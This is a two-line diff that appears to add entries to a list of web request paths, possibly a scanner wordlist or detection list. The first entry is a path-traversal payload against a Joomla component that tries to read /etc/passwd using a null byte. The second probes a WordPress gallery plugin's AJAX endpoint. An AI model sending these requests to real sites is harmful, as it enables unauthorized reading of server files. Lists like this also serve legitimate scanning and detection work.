@@ -1,0 +1,2 @@
+/index.php?option=com_photobattle&view=../../../../../../../../../../etc/passwd%00
+/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1
